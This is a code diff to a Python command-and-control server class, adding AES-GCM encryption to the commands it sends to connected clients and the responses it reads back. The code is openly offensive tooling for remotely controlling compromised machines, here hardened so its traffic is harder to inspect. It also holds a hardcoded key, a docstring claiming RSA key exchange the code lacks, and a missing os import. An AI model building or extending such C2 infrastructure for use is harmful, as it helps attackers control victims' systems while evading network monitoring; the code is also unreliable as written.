@@ -1,13 +1,29 @@
 import socket
 import threading
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 class C2Server:
+    """
+    encryption- asymmetric (RSA) for key exchange, symmetric (AES) for commands/data
+    """
     def __init__(self, host='0.0.0.0', port=5555):
+        self.key = b'this_is_a_32_byte_secret_keyyyyy' #TODO temp
+        self.aesgcm = AESGCM(self.key)
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp
         self.server_socket.bind((host, port))
         self.server_socket.listen(5) # up to 5 clients
         self.clients = {}  # {id: (socket, address)}
         self.client_id_counter = 1
+
+    def encrypt_data(self, data_str):
+        nonce = os.urandom(12)
+        ciphertext = self.aesgcm.encrypt(nonce, data_str.encode(), None)
+        return nonce + ciphertext
+
+    def decrypt_data(self, raw_data):
+        nonce = raw_data[:12]
+        ciphertext = raw_data[12:]
+        return self.aesgcm.decrypt(nonce, ciphertext, None).decode()
 
     def listen_for_clients(self): #seperate thread for new clients
         print(f"[*] Server started on {self.server_socket.getsockname()}")
@@ -25,12 +41,13 @@ class C2Server:
         
         client_socket, _ = self.clients[client_id]
         try:
-            client_socket.send(cmd.encode())
+            data_to_send = self.encrypt_data(cmd)
+            client_socket.send(data_to_send)
             if cmd == "kill":
                 print(f"[*] Sent kill command to Client {client_id}")
                 del self.clients[client_id]
             else:
-                response = client_socket.recv(1024).decode() #buffer size 1024 bytes; utf
+                response = self.decrypt_data(client_socket.recv(1024)) 
                 print(f"[*] Response from Client {client_id}: {response}")
         except Exception as e:
             print(f"[-] Error communicating with client {client_id}: {e}")
